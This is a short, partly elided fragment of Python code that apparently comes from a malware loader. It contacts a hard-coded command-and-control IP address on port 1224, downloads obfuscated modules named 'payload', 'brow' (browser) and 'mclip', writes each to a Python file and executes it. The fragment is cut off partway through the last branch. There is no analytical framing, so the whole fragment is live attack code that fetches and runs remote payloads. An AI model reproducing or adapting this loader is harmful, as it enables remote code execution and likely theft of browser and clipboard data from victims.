...
def download_payload(endpoint, sType, gType):
    url_c2 = f"http://5.253.43.122:1224/{endpoint}/{sType}/{gType}"
    try:
...
def main():
    ...
    obfuscated_payload = download_payload("payload", sType, gType)
    if obfuscated_payload:
        print(f"[+] Downloaded obfuscated payload.")
        execute_payload(obfuscated_payload, "payload.py")

    obfuscated_brow = download_payload("brow", sType, gType)
    if obfuscated_brow:
        print(f"[+] Downloaded obfuscated browser module.")
        execute_payload(obfuscated_brow, "brow.py")

    obfuscated_mclip = download_payload("mclip", sType, gType)
    if obfuscated_mclip:
